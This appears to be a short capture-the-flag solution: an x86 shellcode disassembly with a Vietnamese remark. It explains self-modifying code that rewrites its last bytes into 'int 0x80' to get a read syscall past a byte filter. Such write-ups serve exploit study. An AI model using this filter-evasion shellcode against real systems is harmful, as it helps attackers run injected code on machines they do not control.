# solution

```
0:  31 db                   xor    ebx,ebx
2:  68 8c a0 04 08          push   0x804a08c
7:  59                      pop    ecx
8:  31 d2                   xor    edx,edx
a:  b6 01                   mov    dh,0x1
c:  31 c0                   xor    eax,eax
e:  83 c0 03                add    eax,0x3
11: 31 f6                   xor    esi,esi
13: 81 c6 8a a0 04 08       add    esi,0x804a08a
19: 8b 3e                   mov    edi,DWORD PTR [esi]
1b: 81 f7 78 56 34 12       xor    edi,0x12345678
21: 81 2e b5 d6 34 12       sub    DWORD PTR [esi],0x1234d6b5
27: 01 3e                   add    DWORD PTR [esi],edi
29: 90                      nop
2a: b5 d6                   mov    ch,0xd6
2c: 34 12                   xor    al,0x12
```

dùng self-modifying shellcode xor 4 byte cuối thành 0x80cd để có `int 0x80`